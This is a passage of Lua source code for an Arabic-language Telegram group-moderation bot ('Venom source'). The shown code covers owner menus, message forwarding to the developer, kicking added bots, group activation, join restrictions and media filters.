Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'venom_source')..')'..' ❩\n𖠧︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevAbs:srem(Venom..'Abs:VipMem:'..msg.chat_id_, result.id_)
DevAbs:del(Venom.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrabs == "ادمن" and Admin(msg) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'venom_source')..')'..' ❩\n𖠧︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevAbs:srem(Venom..'Abs:Admins:'..msg.chat_id_, result.id_)
DevAbs:del(Venom.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrabs == "مدير" and Manager(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'venom_source')..')'..' ❩\n𖠧︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevAbs:srem(Venom..'Abs:Managers:'..msg.chat_id_, result.id_)
DevAbs:del(Venom.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrabs == "عضو" then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'venom_source')..')'..' ❩\n𖠧︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙*المعرف غير صحيح*", 1, 'md')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end  
end
--     Source Venom     --
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match("-100(%d+)") then
DevAbs:incr(Venom..'Abs:UsersMsgs'..Venom..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
DevAbs:incr(Venom..'Abs:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
DevAbs:incr(Venom..'Abs:MsgNumberDay'..msg.chat_id_..':'..os.date('%d'))  
ChatType = 'sp' 
elseif id:match("^(%d+)") then
if not DevAbs:sismember(Venom.."Abs:Users",msg.chat_id_) then
DevAbs:sadd(Venom.."Abs:Users",msg.chat_id_)
end
ChatType = 'pv' 
else
ChatType = 'gp' 
end
end 
--     Source Venom     --
if ChatType == 'pv' then 
if text == '/start' or text == 'رجوع ،🔙‘' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '𖠧︙مرحبا عزيزي المطور \n𖠧︙انت المطور الاساسي هنا \n𖠧︙اليك ازرار سورس ڤينوم \n𖠧︙تستطيع التحكم بكل الاوامر فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'وضع اسم البوت','↫ تحديث 𖠧','وضع كليشه المطور'},
{'↫ المطورين 𖠧','↫ الاحصائيات 𖠧'},
{'↫ المجموعات 𖠧','روابط الكروبات','↫ المشتركين 𖠧'},
{'↫ تعطيل التواصل 𖠧','↫ تفعيل التواصل 𖠧'},
{'تنظيف الكروبات','↫ قائمه العام 𖠧','تنظيف المشتركين'},
{'↫ تغير المطور الاساسي 𖠧'},
{'تعطيل ترحيب البوت','تفعيل ترحيب البوت'},
{'↫ تغير معلومات الترحيب 𖠧'},
{'↫ تعطيل المغادره 𖠧','↫ تفعيل المغادره 𖠧'},
{'↫ تعطيل الاذاعه 𖠧','↫ تفعيل الاذاعه 𖠧'},
{'↫ اذاعه بالتثبيت 𖠧'},
{'↫ اذاعه عام 𖠧','↫ اذاعه خاص 𖠧'},
{'↫ اذاعه عام بالتوجيه 𖠧','↫ اذاعه خاص بالتوجيه 𖠧'},
{'~ تعيين كلايش الاوامر ~'},
{'تعطيل البوت الخدمي','تفعيل البوت الخدمي'},
{'جلب نسخه السورس','تحديث السورس','جلب نسخه الكروبات'},
{'↫ حذف رد عام 𖠧','↫ الردود العام 𖠧','↫ اضف رد عام 𖠧'},
{'↫ حذف رد الخاص 𖠧','↫ تعيين رد الخاص 𖠧'},
{'حذف قناة الاشتراك','قناة الاشتراك','تعيين قناة الاشتراك'},
{'حذف كليشه الاشتراك','كليشه الاشتراك','تغير كليشه الاشتراك'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '~ تعيين كلايش الاوامر ~' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '𖠧︙اهلا بك مجددا عزيزي المطور \n𖠧︙اليك الازرار الخاصه بتعديل وتغيير كلايش سورس ڤينوم فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'حذف كليشة الايدي','تعيين كليشة الايدي'},
{'تعيين امر الاوامر'},
{'تعيين امر م3','تعيين امر م2','تعيين امر م1'},
{'تعيين امر م6','تعيين امر م5','تعيين امر م4'},
{'استعادة كلايش الاوامر'},
{'رجوع ،🔙‘'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '/start' and ChCheck(msg) then  
if not DevAbs:get(Venom..'Abs:Start:Time'..msg.sender_user_id_) then
tdcli_function({ID="GetUser",user_id_=Venom},function(arg,dp) 
local inline = {{{text="𖠧 اضفني في مجموعتك 𖠧",url="t.me/"..dp.username_.."?startgroup=botstart"}}}
local start = DevAbs:get(Venom.."Abs:Start:Bot")
if start then 
Start_Source = start
else
Start_Source = "𖠧︙مرحبا انا بوت اسمي "..NameBot.."\n𖠧︙اختصاصي حماية المجموعات\n𖠧︙من التفليش والسبام والخخ .. . ،\n𖠧︙تفعيلي سهل ومجانا فقط قم برفعي ادمن في مجموعتك وارسل امر ↫ تفعيل\n𖠧︙سيتم رفع الادمنيه والمنشئ تلقائيا"
end 
SendInline(msg.chat_id_,Start_Source,nil,inline)
end,nil)
end
DevAbs:setex(Venom..'Abs:Start:Time'..msg.sender_user_id_,300,true)
return false
end 
--     Source Venom     --
if not SecondSudo(msg) and not DevAbs:sismember(Venom..'Abs:Ban:Pv',msg.sender_user_id_) and not DevAbs:get(Venom..'Abs:Texting:Pv') then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,chat) 
Dev_Abs(msg.sender_user_id_, msg.id_, 1, '𖠧︙تم ارسال رسالتك الى [المطور](t.me/'..(chat.username_ or "venom_source")..')', 1, 'md') 
tdcli_function({ID="ForwardMessages",chat_id_=DevId,from_chat_id_= msg.sender_user_id_,message_ids_={[0]=msg.id_},disable_notification_=1,from_background_=1},function(arg,data) 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
if data and data.messages_ and data.messages_[0] ~= false and data.ID ~= "Error" then
if data and data.messages_ and data.messages_[0].content_.sticker_ then
SendText(DevId,'𖠧︙تم ارسال الملصق من ↫ ⤈\n['..string.sub(dp.first_name_,0, 40)..'](tg://user?id='..dp.id_..')',0,'md') 
return false
end;end;end,nil);end,nil);end,nil);end
if SecondSudo(msg) and msg.reply_to_message_id_ ~= 0  then    
tdcli_function({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)},function(extra, result, success) 
if result.forward_info_.sender_user_id_ then     
id_user = result.forward_info_.sender_user_id_    
end 
tdcli_function ({ID = "GetUser",user_id_ = id_user},function(arg,data) 
if text == 'حظر' or text == 'حضر' then
local Text = '𖠧︙العضو ↫ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\n𖠧︙تم حظره من التواصل'
SendText(DevId,Text,msg.id_/2097152/0.5,'md') 
DevAbs:sadd(Venom..'Abs:Ban:Pv',data.id_)  
return false  
end 
if text == 'الغاء الحظر' or text == 'الغاء حظر' then
local Text = '𖠧︙العضو ↫ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\n𖠧︙تم الغاء حظره من التواصل'
SendText(DevId,Text,msg.id_/2097152/0.5,'md') 
DevAbs:srem(Venom..'Abs:Ban:Pv',data.id_)  
return false  
end 
tdcli_function({ID='GetChat',chat_id_ = id_user},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = id_user, action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,dp) 
if dp.code_ == 400 or dp.code_ == 5 then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙العضو قام بحظر البوت لا تستطيع ارسال الرسائل له', 1, 'md')
return false  
end 
if text then
Dev_Abs(id_user, 0, 1, text, 1, "md")  
Text = '𖠧︙تم ارسال الرساله الى ↫ ⤈'
elseif msg.content_.ID == 'MessageSticker' then    
sendSticker(id_user, msg.id_, 0, 1,nil, msg.content_.sticker_.sticker_.persistent_id_)   
Text = '𖠧︙تم ارسال الملصق الى ↫ ⤈'
elseif msg.content_.ID == 'MessagePhoto' then    
sendPhoto(id_user, msg.id_, 0, 1,nil, msg.content_.photo_.sizes_[0].photo_.persistent_id_,(msg.content_.caption_ or ''))    
Text = '𖠧︙تم ارسال الصوره الى ↫ ⤈'
elseif msg.content_.ID == 'MessageAnimation' then    
sendDocument(id_user, msg.id_, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_)    
Text = '𖠧︙تم ارسال المتحركه الى ↫ ⤈'
elseif msg.content_.ID == 'MessageVoice' then    
sendVoice(id_user, msg.id_, 0, 1,nil, msg.content_.voice_.voice_.persistent_id_)    
Text = '𖠧︙تم ارسال البصمه الى ↫ ⤈'
end     
SendText(DevId, Text..'\n'..'['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')',0,'md') 
end,nil);
end,nil);
end,nil);
end,nil);
end 
end 
--     Source Venom     --
if text and DevAbs:get(Venom..'Abs:Start:Bots'..msg.sender_user_id_) then
if text == 'الغاء' then   
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم الغاء حفظ كليشة الستارت', 1, 'md')
DevAbs:del(Venom..'Abs:Start:Bots'..msg.sender_user_id_) 
return false
end
DevAbs:set(Venom.."Abs:Start:Bot",text)  
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم حفظ كليشة الستارت', 1, 'md')
DevAbs:del(Venom..'Abs:Start:Bots'..msg.sender_user_id_) 
return false
end
if SecondSudo(msg) then
if text == 'تعيين رد الخاص' or text == 'ضع كليشه ستارت' or text == '↫ تعيين رد الخاص 𖠧' then 
DevAbs:set(Venom..'Abs:Start:Bots'..msg.sender_user_id_,true) 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙ارسل لي كليشة الستارت الان', 1, 'md')
return false
end
if text == 'حذف رد الخاص' or text == 'حذف كليشه ستارت' or text == '↫ حذف رد الخاص 𖠧' then 
DevAbs:del(Venom..'Start:Bot') 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم حذف كليشة الستارت بنجاح', 1, 'md')
end
if text == 'جلب رد الخاص' then  
local start = DevAbs:get(Venom.."Abs:Start:Bot")
if start then 
Start_Source = start
else
Start_Source = "𖠧︙مرحبا انا بوت اسمي "..NameBot.."\n𖠧︙اختصاصي حماية المجموعات\n𖠧︙من التفليش والسبام والخخ .. . ،\n𖠧︙تفعيلي سهل ومجانا فقط قم برفعي ادمن في مجموعتك وارسل امر ↫ تفعيل\n𖠧︙سيتم رفع الادمنيه والمنشئ تلقائيا"
end 
Dev_Abs(msg.chat_id_, msg.id_, 1, Start_Source, 1, 'md')
return false
end
if text == 'تفعيل التواصل' or text == '↫ تفعيل التواصل 𖠧' then   
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تفعيل التواصل بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:del(Venom..'Abs:Texting:Pv') 
end
if text == 'تعطيل التواصل' or text == '↫ تعطيل التواصل 𖠧' then  
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تعطيل التواصل بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:set(Venom..'Abs:Texting:Pv',true) 
end
end
--     Source Venom     --
function getUser(user_id, cb)
tdcli_function ({
ID = "GetUser",
user_id_ = user_id
}, cb, nil)
end
local msg = data.message_
text = msg.content_.text_
if msg.content_.ID == "MessageChatAddMembers" then 
DevAbs:incr(Venom..'Abs:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)
DevAbs:set(Venom.."Who:Added:Me"..msg.chat_id_..':'..msg.content_.members_[0].id_,msg.sender_user_id_)
local mem_id = msg.content_.members_  
local Bots = DevAbs:get(Venom.."Abs:Lock:Bots"..msg.chat_id_) 
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "kick" and not VipMem(msg) then   
https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp) local admins = dp.members_ for i=0 , #admins do if dp.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not VipMem(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "del" and not VipMem(msg) then   
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp) local admins = dp.members_ for i=0 , #admins do if dp.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not VipMem(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "ked" and not VipMem(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_.."&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false")
DevAbs:sadd(Venom..'Abs:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp) local admins = dp.members_ for i=0 , #admins do if dp.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not VipMem(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end  
end  
end
if msg.content_.ID == "MessageChatDeleteMember" and tonumber(msg.content_.user_.id_) == tonumber(Venom) then 
DevAbs:srem(Venom.."Abs:Groups", msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
if not Sudo(msg) and not Bot(msg) then
SendText(DevId,"𖠧︙تم طرد البوت من المجموعه ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n𖠧︙بواسطة ↫ "..Name.."\n𖠧︙اسم المجموعه ↫ ["..NameChat.."]\n𖠧︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n𖠧︙الوقت ↫ "..os.date("%I:%M%p").."\n𖠧︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end
end,nil)
end,nil)
end
if msg.content_.ID == "MessageChatDeletePhoto" or msg.content_.ID == "MessageChatChangePhoto" or msg.content_.ID == 'MessagePinMessage' or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == 'MessageChatChangeTitle' or msg.content_.ID == "MessageChatDeleteMember" then   
if DevAbs:get(Venom..'Abs:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})    
end   
end
if msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" then   
DevAbs:incr(Venom..'Abs:EntryNumber'..msg.chat_id_..':'..os.date('%d'))  
elseif msg.content_.ID == "MessageChatDeleteMember" then   
DevAbs:incr(Venom..'Abs:ExitNumber'..msg.chat_id_..':'..os.date('%d'))  
end
--     Source Venom     --
if text ==('تفعيل') and not SudoBot(msg) and ChCheck(msg) then
if not DevAbs:get(Venom..'Abs:Lock:FreeBot'..Venom) then
if ChatType == 'pv' then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙لاتستطيع تفعيلي هنا يرجى اضافتي في مجموعه اولا', 1, 'md')
return false
end
if ChatType ~= 'sp' then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙المجموعه عاديه وليست خارقه لا تستطيع تفعيلي يرجى ان تضع سجل رسائل المجموعه ضاهر وليس مخفي ومن بعدها يمكنك رفعي ادمن ثم تفعيلي', 1, 'md')
return false
end
if msg.can_be_deleted_ == false then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙البوت ليس ادمن يرجى ترقيتي !', 1, 'md')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,ChatMem) 
if ChatMem and ChatMem.status_.ID == "ChatMemberStatusEditor" or ChatMem and ChatMem.status_.ID == "ChatMemberStatusCreator" then
if ChatMem and ChatMem.user_id_ == msg.sender_user_id_ then
if ChatMem.status_.ID == "ChatMemberStatusCreator" then
status = 'منشئ'
elseif ChatMem.status_.ID == "ChatMemberStatusEditor" then
status = 'ادمن'
else 
status = 'عضو'
end
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,abbas) 
local admins = abbas.members_
for i=0 , #admins do
if abbas.members_[i].bot_info_ == false and abbas.members_[i].status_.ID == "ChatMemberStatusEditor" then
DevAbs:sadd(Venom..'Abs:Admins:'..msg.chat_id_, admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevAbs:srem(Venom..'Abs:Admins:'..msg.chat_id_, admins[i].user_id_)
end
end,nil)   
else
DevAbs:sadd(Venom..'Abs:Admins:'..msg.chat_id_, admins[i].user_id_)
end
if abbas.members_[i].status_.ID == "ChatMemberStatusCreator" then
DevAbs:sadd(Venom.."Abs:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevAbs:sadd(Venom.."Abs:AbsConstructor:"..msg.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevAbs:srem(Venom.."Abs:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevAbs:srem(Venom.."Abs:AbsConstructor:"..msg.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
end,nil)
if DevAbs:sismember(Venom..'Abs:Groups',msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙المجموعه بالتاكيد مفعله', 1, 'md')
else
if tonumber(data.member_count_) < tonumber(DevAbs:get(Venom..'Abs:Num:Add:Bot') or 0) and not SecondSudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙عدد اعضاء المجموعه اقل من ↫ *'..(DevAbs:get(Venom..'Abs:Num:Add:Bot') or 0)..'* عضو', 1, 'md')
return false
end
ReplyStatus(msg,result.id_,"ReplyBy","𖠧︙تم تفعيل المجموعه "..dp.title_)  
DevAbs:sadd(Venom.."Abs:Groups",msg.chat_id_)
DevAbs:sadd(Venom..'Abs:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NumMem = data.member_count_
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'لا يوجد'
end
DevAbs:set(Venom.."Abs:Groups:Links"..msg.chat_id_,LinkGroup) 
SendText(DevId,"𖠧︙تم تفعيل مجموعه جديده ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n𖠧︙بواسطة ↫ "..Name.."\n𖠧︙موقعه في المجموعه ↫ "..status.."\n𖠧︙اسم المجموعه ↫ ["..NameChat.."]\n𖠧︙عدد اعضاء المجموعه ↫ ❨ *"..NumMem.."* ❩\n𖠧︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n𖠧︙رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n𖠧︙الوقت ↫ "..os.date("%I:%M%p").."\n𖠧︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end
end end
end,nil)
end,nil)
end,nil)
end,nil)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙لا تستطيع تفعيل هذه المجموعه بسبب تعطيل البوت الخدمي من قبل المطور الاساسي', 1, 'md') 
end 
end 
--     Source Venom     --
if msg.date_ and msg.date_ < tonumber(os.time() - 30) then
print("*( OLD MESSAGE )*")
return false
end
--     Source Venom     --
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
DevAbs:set(Venom..'Save:UserName'..msg.sender_user_id_,data.username_)
end;end,nil) 
--     Source Venom     --
local ReFalse = tostring(msg.chat_id_)
if not DevAbs:sismember(Venom.."Abs:Groups",msg.chat_id_) and not ReFalse:match("^(%d+)") and not SudoBot(msg) then
print("Return False : The Bot Is Not Enabled In The Group")
return false
end
--     Source Venom     --
-------- MSG TYPES ---------
if msg.content_.ID == "MessageChatJoinByLink" and not VipMem(msg) then 
if DevAbs:get(Venom..'Abs:Lock:Robot'..msg.chat_id_) then
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..dp.id_)
DevAbs:sadd(Venom..'Abs:Tkeed:'..msg.chat_id_, dp.id_)
local Text = '𖠧︙اهلا عزيزي ↫ ['..string.sub(dp.first_name_,0, 40)..'](tg://user?id='..dp.id_..')\n𖠧︙يجب علينا التأكد أنك لست روبوت\n𖠧︙تم تقيدك اضغط الزر بالاسفل لفكه'
keyboard = {} 
keyboard.inline_keyboard = {{{text="اضغط هنا لفك تقيدك",callback_data="/UnTkeed"}}} 
Msg_id = msg.id_/2097152/0.5
HTTPS.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text='..URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)
return false
end
if DevAbs:get(Venom.."Abs:Lock:Join"..msg.chat_id_) then
ChatKick(msg.chat_id_,msg.sender_user_id_) 
return false  
end
end
if msg.content_.ID == "MessagePhoto" then
if not Manager(msg) then 
local filter = DevAbs:smembers(Venom.."Abs:FilterPhoto"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.photo_.id_ then
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","𖠧︙الصوره التي ارسلتها تم منعها من المجموعه")  
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false   
end
end
end
end
if msg.content_.ID == "MessageAnimation" then
if not Manager(msg) then 
local filter = DevAbs:smembers(Venom.."Abs:FilterAnimation"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.animation_.animation_.persistent_id_ then
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","𖠧︙المتحركه التي ارسلتها تم منعها من المجموعه")  
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end
end
if msg.content_.ID == "MessageSticker" then
if not Manager(msg) then 
local filter = DevAbs:smembers(Venom.."Abs:FilterSteckr"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.sticker_.sticker_.persistent_id_ then
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","𖠧︙الملصق الذي ارسلته تم منعه من المجموعه")  
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false   
end
end
end
end
--     Source Venom     --
if text and text:match("^(.*)$") then
local DelGpRedRedods = DevAbs:get(Venom..'Abs:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
local GetGpTexts = DevAbs:get(Venom..'Abs:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
if DelGpRedRedods == 'DelGpRedRedods' then
Dev_Abs(msg.chat_id_, msg.id_, 1,'𖠧︙الرد ↫ '..msg.content_.text_..' للكلمه ↫ '..GetGpTexts..' تم حذفها',  1, "html")
DevAbs:del(Venom..'Abs:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
